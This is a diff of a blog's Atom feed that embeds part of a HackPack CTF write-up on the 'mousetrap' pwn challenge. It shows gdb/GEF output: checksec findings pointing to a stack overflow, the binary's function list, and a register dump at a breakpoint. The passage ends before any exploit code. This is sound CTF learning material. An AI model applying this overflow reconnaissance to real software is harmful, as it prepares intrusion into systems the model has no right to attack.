@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-05-01T18:32:33+05:45</updated><id>http://localhost:4000/feed.xml</id><title type="html">gr4n173</title><subtitle>Hi there, I am a nerd guy who loves everything in between Internet and Security . I reach out to people and teach about CyberSecurity. I like to play with electronics in my spare time so that I can automate my lifestyle . CTF | HTB | Reverse Engineering.
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-05-01T21:03:40+05:45</updated><id>http://localhost:4000/feed.xml</id><title type="html">gr4n173</title><subtitle>Hi there, I am a nerd guy who loves everything in between Internet and Security . I reach out to people and teach about CyberSecurity. I like to play with electronics in my spare time so that I can automate my lifestyle . CTF | HTB | Reverse Engineering.
 </subtitle><author><name>gr4n173&gt;</name></author><entry><title type="html">HackPack CTF: Pwn Challenge</title><link href="http://localhost:4000/2020/05/01/hackpack-ctf-pwn.html" rel="alternate" type="text/html" title="HackPack CTF: Pwn Challenge" /><published>2020-05-01T00:00:00+05:45</published><updated>2020-05-01T00:00:00+05:45</updated><id>http://localhost:4000/2020/05/01/hackpack-ctf-pwn</id><content type="html" xml:base="http://localhost:4000/2020/05/01/hackpack-ctf-pwn.html">&lt;h1 id=&quot;hackpack-ctf&quot;&gt;HackPack CTF&lt;/h1&gt;
 
 &lt;p&gt;HackPack CTF is a security competition that is part of the two security courses at NCSU: CSC-405 Computer Security and CSC-591 Systems Attacks and Defenses. The target audience is people interested in computer security that have some related background (like took a security course before ;) and want to exercise their skills in a secure environment by solving security challenges.
@@ -18,158 +18,166 @@ For more detail you can visit &lt;a href=&quot;https://hackpack.club/ctf2020&quo
 
 &lt;p&gt;&lt;strong&gt;Solution:-&lt;/strong&gt; As I run the challenge I was asked to enter the name randomly and then code Sequence but got the output with &lt;code class=&quot;highlighter-rouge&quot;&gt;SNAAAAAAAP! you died!%&lt;/code&gt;. Now I grabbed my gdb and analyze the ELF file.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-gr4n173@root:~# gdb -q mousetrap
-GEF for linux ready, type `gef' to start, `gef config' to configure
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;gr4n173&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:~&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;# gdb -q mousetrap&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;GEF&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;linux&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ready&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`gef' to start, `&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;gef&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;config&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;' to configure
 78 commands loaded for GDB 9.1 using Python engine 3.8
 [*] 2 commands could not be loaded, run `gef missing` to know why.
 Reading symbols from mousetrap...
 (No debugging symbols found in mousetrap)
-gef➤  info functions
-All defined functions:
-Non-debugging symbols:
-0x00000000004005a0  _init
-0x00000000004005d0  strcpy@plt
-0x00000000004005e0  puts@plt
-0x00000000004005f0  system@plt
-0x0000000000400600  printf@plt
-0x0000000000400610  read@plt
-0x0000000000400620  setvbuf@plt
-0x0000000000400630  _start
-0x0000000000400660  _dl_relocate_static_pie
-0x0000000000400670  deregister_tm_clones
-0x00000000004006a0  register_tm_clones
-0x00000000004006e0  __do_global_dtors_aux
-0x0000000000400710  frame_dummy
-0x0000000000400717  cheeeeeeeese
-0x000000000040072a  init
-0x000000000040078b  set_mouse_name
-0x00000000004007c1  grab_cheese
-0x00000000004007e3  deactivate_trap
-0x0000000000400823  menu
-0x0000000000400842  main
-0x00000000004008c0  __libc_csu_init
-0x0000000000400930  __libc_csu_fini
-0x0000000000400934  _fini
-gef➤
+gef➤ checksec mousetrap
+[*] '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;gr4n173&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pwn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mousetrapfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mousetrap&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;Arch&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;     &lt;span class=&quot;nx&quot;&gt;amd64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;little&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;RELRO&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;Partial&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;RELRO&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;Stack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;    &lt;span class=&quot;nx&quot;&gt;No&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;canary&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;found&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;NX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;       &lt;span class=&quot;nx&quot;&gt;NX&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;enabled&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;PIE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;      &lt;span class=&quot;nx&quot;&gt;No&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;PIE&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x400000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;From this output, RELRO(partial) indicate lazy binding was possible and NX(non-executable) enabled I was unable inject shellcode but Stack &lt;code class=&quot;highlighter-rouge&quot;&gt;No canary found&lt;/code&gt; indicated there was buffer overflow.&lt;/p&gt;
+
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;gef&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;➤&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;info&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;functions&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;All&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;defined&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;functions&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Non&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;debugging&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000004005a0&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;_init&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000004005d0&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plt&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000004005e0&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;puts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plt&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000004005f0&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plt&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400600&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plt&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400610&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plt&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400620&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;setvbuf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;plt&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400630&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;_start&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400660&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;_dl_relocate_static_pie&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400670&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;deregister_tm_clones&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000004006a0&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;register_tm_clones&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000004006e0&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;__do_global_dtors_aux&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400710&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;frame_dummy&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400717&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;cheeeeeeeese&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x000000000040072a&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;init&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x000000000040078b&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;set_mouse_name&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000004007c1&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;grab_cheese&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000004007e3&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;deactivate_trap&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400823&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;menu&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400842&lt;/span&gt;  &lt;span class=&quot;nb&quot;&gt;main&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x00000000004008c0&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;__libc_csu_init&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400930&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;__libc_csu_fini&lt;/span&gt;
+&lt;span class=&quot;mh&quot;&gt;0x0000000000400934&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;_fini&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;gef&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;➤&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Then I break a point in &lt;code class=&quot;highlighter-rouge&quot;&gt;set_mouse_name&lt;/code&gt; function and the I run it.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-gef➤  break set_mouse_name
-Breakpoint 1 at 0x40078f
-gef➤  run
-Starting program: /home/bikram/mystuff/onlinectf/hackpack/pwn/mousetrapfile/mousetrap 
-Welcome little mouse
-can you steal the cheese from the mouse trap
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;gef&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;➤&lt;/span&gt;  &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;set_mouse_name&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Breakpoint&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;at&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x40078f&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;gef&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;➤&lt;/span&gt;  &lt;span class=&quot;nx&quot;&gt;run&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;Starting&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;program&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;bikram&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mystuff&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onlinectf&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;hackpack&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pwn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mousetrapfile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;mousetrap&lt;/span&gt; 
+&lt;span class=&quot;nx&quot;&gt;Welcome&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;little&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mouse&lt;/span&gt;
+&lt;span class=&quot;nx&quot;&gt;can&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;you&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;steal&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;cheese&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;mouse&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;trap&lt;/span&gt;
 
-Breakpoint 1, 0x000000000040078f in set_mouse_name ()
-[ Legend: Modified register | Code | Heap | Stack | String ]
-[ Legend: Modified register | Code | Heap | Stack | String ]
-─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
-$rax   : 0x00007fffffffdc90  →  0x00000000004008c0  →  &amp;lt;__libc_csu_init+0&amp;gt; push r15
-$rbx   : 0x0               
-$rcx   : 0x00007ffff7ece643  →  0x5577fffff0003d48 (&quot;H=&quot;?)
-$rdx   : 0x0               
-$rsp   : 0x00007fffffffdb70  →  0x00007fffffffdcb0  →  0x00000000004008c0  →  &amp;lt;__libc_csu_init+0&amp;gt; push r15
-$rbp   : 0x00007fffffffdb70  →  0x00007fffffffdcb0  →  0x00000000004008c0  →  &amp;lt;__libc_csu_init+0&amp;gt; push r15
-$rsi   : 0x00007ffff7f9d723  →  0xf9f4c0000000000a
-$rdi   : 0x00007fffffffdc90  →  0x00000000004008c0  →  &amp;lt;__libc_csu_init+0&amp;gt; push r15
-$rip   : 0x000000000040078f  →  &amp;lt;set_mouse_name+4&amp;gt; sub rsp, 0x10
-$r8    : 0x2d              
-$r9    : 0x00007ffff7fe3530  →  &amp;lt;_dl_fini+0&amp;gt; push rbp
-$r10   : 0x00007ffff7fef7c0  →  &amp;lt;strcmp+2544&amp;gt; pxor xmm0, xmm0
-$r11   : 0x246             
-$r12   : 0x0000000000400630  →  &amp;lt;_start+0&amp;gt; xor ebp, ebp
-$r13   : 0x00007fffffffdd90  →  0x0000000000000001
-$r14   : 0x0               
-$r15   : 0x0               
-$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
-$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
-─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
-0x00007fffffffdb70│+0x0000: 0x00007fffffffdcb0  →  0x00000000004008c0  →  &amp;lt;__libc_csu_init+0&amp;gt; push r15	 ← $rsp, $rbp
-0x00007fffffffdb78│+0x0008: 0x000000000040087d  →  &amp;lt;main+59&amp;gt; mov rdx, QWORD PTR [rbp-0x8]
-0x00007fffffffdb80│+0x0010: 0x00007fffffffdd98  →  0x00007fffffffe120  →  &quot;/home/bikram/mystuff/onlinectf/hackpack/pwn/mouset[...]&quot;
-0x00007fffffffdb88│+0x0018: 0x00000001ffffdcd0
-0x00007fffffffdb90│+0x0020: 0x0000000000000000
-0x00007fffffffdb98│+0x0028: 0x0000000000000000
-0x00007fffffffdba0│+0x0030: 0x0000000000000000
-0x00007fffffffdba8│+0x0038: 0x00007ffff7ffe730  →  0x00007ffff7fd2000  →  0x00010102464c457f
-───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
-     0x400786 &amp;lt;init+92&amp;gt;        (bad)  
-     0x400787 &amp;lt;init+93&amp;gt;        call   QWORD PTR [rax+0x4855c35d]
-     0x40078d &amp;lt;set_mouse_name+2&amp;gt; mov    ebp, esp
- →   0x40078f &amp;lt;set_mouse_name+4&amp;gt; sub    rsp, 0x10
-     0x400793 &amp;lt;set_mouse_name+8&amp;gt; mov    QWORD PTR [rbp-0x8], rdi
-     0x400797 &amp;lt;set_mouse_name+12&amp;gt; lea    rdi, [rip+0x1b2]        # 0x400950
-     0x40079e &amp;lt;set_mouse_name+19&amp;gt; mov    eax, 0x0
-     0x4007a3 &amp;lt;set_mouse_name+24&amp;gt; call   0x400600 &amp;lt;printf@plt&amp;gt;
-     0x4007a8 &amp;lt;set_mouse_name+29&amp;gt; mov    rax, QWORD PTR [rbp-0x8]
-───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
-[#0] Id 1, Name: &quot;mousetrap&quot;, stopped 0x40078f in set_mouse_name (), reason: BREAKPOINT
-─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
-[#0] 0x40078f → set_mouse_name()
-[#1] 0x40087d → main()
+&lt;span class=&quot;nx&quot;&gt;Breakpoint&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000000000040078f&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;set_mouse_name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Legend&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Modified&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;register&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Heap&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Stack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Legend&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Modified&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;register&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Code&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Heap&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Stack&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;registers&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;────&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rax&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007fffffffdc90&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x00000000004008c0&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__libc_csu_init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r15&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rbx&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;               
+&lt;span class=&quot;nv&quot;&gt;$rcx&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007ffff7ece643&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x5577fffff0003d48&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;H=&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rdx&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0&lt;/span&gt;               
+&lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb70&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x00007fffffffdcb0&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x00000000004008c0&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__libc_csu_init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r15&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rbp&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007fffffffdb70&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x00007fffffffdcb0&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x00000000004008c0&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__libc_csu_init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r15&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rsi&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007ffff7f9d723&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0xf9f4c0000000000a&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rdi&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00007fffffffdc90&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;mh&quot;&gt;0x00000000004008c0&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;__libc_csu_init&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;r15&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;$rip&lt;/span&gt;   &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x000000000040078f&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;→&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;set_mouse_name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sub&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;rsp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x10&lt;/span&gt;
